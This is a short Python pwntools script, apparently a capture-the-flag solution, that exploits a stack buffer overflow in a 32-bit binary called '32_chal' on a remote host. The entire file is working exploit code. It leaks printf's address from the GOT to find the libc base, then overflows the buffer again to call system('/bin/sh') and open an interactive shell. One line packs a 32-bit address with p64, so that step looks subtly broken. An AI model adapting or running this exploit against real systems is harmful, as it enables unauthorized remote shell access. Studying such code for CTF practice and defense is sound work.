#!/usr/bin/env python

from pwn import *

local = False
debug = False


addr_unpacker = make_unpacker(32, endian='little', sign='unsigned')


libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if not local: libc = ELF('./libc.so.6')


r = process('./32_chal')
if not local: r = remote('163.172.176.29', 9036)

if debug:
    gdb.attach(r, '''
set follow-fork-mode child
break *0x080484D8
continue''')

leak_payload = '\x90'*112
leak_payload += p32(0x08048370) # _write
leak_payload += p32(0x0804847D) #  return to main
leak_payload += p32(0x01) # fd
leak_payload += p32(0x0804A010) # got.plt: printf
leak_payload += p32(0x4) # n
leak_payload += p32(0x080484D8)

r.recvline()
r.sendline(leak_payload)
junk = r.recv(10)
leaked_printf_addr = addr_unpacker(r.recv(4))

libc.address = leaked_printf_addr - libc.symbols['printf']



payload = '\x90'*104

payload += p32(libc.symbols['system'])
payload += p32(libc.symbols['exit'])
payload += p64(next(libc.search('/bin/sh\x00')))


r.sendline(payload)

r.interactive()
